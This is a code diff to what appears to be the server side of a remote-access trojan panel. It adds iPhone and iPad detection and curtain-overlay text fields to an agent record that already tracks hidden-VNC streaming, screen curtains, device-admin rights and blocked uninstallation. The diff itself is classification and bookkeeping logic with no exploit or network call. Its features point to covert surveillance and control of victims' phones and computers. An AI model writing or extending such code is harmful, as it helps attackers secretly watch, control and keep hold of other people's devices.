@@ -211,13 +211,25 @@ class ConnectedAgent:
     def to_dict(self) -> Dict[str, Any]:
         from .ota_manager import OTAManager
 
-        # Precise Android vs Windows detection
+        # Precise Apple iOS vs Android vs Windows detection
         arch_str = str(self.client_info.get("arch", "")).lower()
         os_str = str(self.client_info.get("os", "")).lower()
         platform_str = str(self.client_info.get("platform", "")).lower()
         dev_type = str(self.client_info.get("device_type", "")).lower()
+        dev_name = str(self.client_info.get("device_name", "")).lower()
 
-        is_android = (
+        is_ios = (
+            self.client_info.get("is_ios") is True or
+            arch_str == "ios" or
+            "ios" in os_str or
+            platform_str == "ios" or
+            "iphone" in dev_type or
+            "ipad" in dev_type or
+            "iphone" in dev_name or
+            "ipad" in dev_name
+        )
+
+        is_android = not is_ios and (
             self.client_info.get("is_android") is True or
             "android" in arch_str or
             "android" in os_str or
@@ -225,18 +237,31 @@ class ConnectedAgent:
             "phone" in dev_type
         )
 
-        if not is_android:
+        if not is_android and not is_ios:
             try:
                 from .registry import AgentRegistry
                 pkg = AgentRegistry.get_package(self.agent_id)
                 if pkg:
                     pkg_arch = str(pkg.get("arch", "")).lower()
-                    if "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
+                    if "ios" in pkg_arch or pkg.get("profile_filename"):
+                        is_ios = True
+                    elif "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
                         is_android = True
             except Exception:
                 pass
 
-        if is_android:
+        if is_ios:
+            server_hash = ""
+            agent_hash = self.client_info.get("code_hash", "")
+            has_update = False
+            resolved_os = self.client_info.get("os") or "Apple iOS"
+            resolved_arch = self.client_info.get("arch") or "arm64"
+            fallback_hostname = self.client_info.get("device_name") or "iPhone"
+            fallback_username = "iOS User"
+            cpu_val = self.client_info.get("cpu", "Apple Silicon")
+            update_version = "1.0.0-ios"
+            update_description = "iOS Web Agent is up to date."
+        elif is_android:
             android_manifest = OTAManager.get_android_manifest()
             server_hash = android_manifest.get("overall_hash", "")
             agent_hash = self.client_info.get("code_hash", "")
@@ -276,10 +301,11 @@ class ConnectedAgent:
             "username": username_val,
             "os": resolved_os,
             "arch": resolved_arch,
-            "platform": "android" if is_android else "windows",
+            "platform": "ios" if is_ios else ("android" if is_android else "windows"),
             "is_android": is_android,
+            "is_ios": is_ios,
             "device_name": self.client_info.get("device_name", hostname_val),
-            "device_type": "phone" if is_android else "desktop",
+            "device_type": "phone" if (is_android or is_ios) else "desktop",
             "battery": self.client_info.get("battery"),
             "battery_charging": self.client_info.get("battery_charging"),
             "ram_gb": self.client_info.get("ram_gb", 0),
@@ -291,6 +317,9 @@ class ConnectedAgent:
             "is_streaming": self.is_streaming_hvnc,
             "is_mirroring": self.is_streaming_mirror,
             "curtain_active": bool(self.client_info.get("curtain_active", False)),
+            "curtain_title": self.client_info.get("curtain_title", ""),
+            "curtain_message": self.client_info.get("curtain_message", ""),
+            "curtain_subtitle": self.client_info.get("curtain_subtitle", ""),
             "is_device_owner": bool(self.client_info.get("is_device_owner", False)),
             "is_device_admin": bool(self.client_info.get("is_device_admin", False)),
             "uninstall_blocked": bool(self.client_info.get("uninstall_blocked", False)),
@@ -821,8 +850,13 @@ class AgentManager:
             record = dict(data)
             record["status"] = "offline"
 
-            is_android = record.get("is_android", False)
-            if is_android:
+            is_ios = record.get("is_ios", False) or record.get("platform") == "ios"
+            is_android = not is_ios and record.get("is_android", False)
+            if is_ios:
+                record["has_update"] = False
+                record["update_version"] = "1.0.0-ios"
+                record["update_description"] = "iOS Web Agent is up to date."
+            elif is_android:
                 server_hash = android_manifest.get("overall_hash", "")
                 agent_hash = record.get("code_hash", "")
                 record["server_hash"] = server_hash
